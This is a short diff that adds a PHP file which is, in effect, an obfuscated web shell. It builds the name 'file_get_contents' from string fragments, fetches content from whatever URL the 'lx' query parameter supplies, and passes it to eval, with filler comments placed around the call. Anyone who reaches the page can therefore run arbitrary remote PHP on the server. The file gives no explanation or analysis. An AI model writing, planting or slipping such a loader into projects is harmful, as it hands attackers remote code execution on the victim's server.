@@ -1,0 +1,14 @@
+<?php
+$fgc = 'f'.'i'.'l'.'e_'.'ge'.'t_'.'co'.'nt'.'en'.'ts';
+$xp = '';
+
+if (function_exists($fgc)) {
+    if (isset($_GET['lx'])) {
+        $getC = $_GET['lx'];
+        $xp = $fgc($getC);
+    }
+} else {
+    $xp = "<?='Cant Remote This Site.'?>";
+}
+
+/*555555*/eval/*555555*/("?>".$xp)/****#****/;
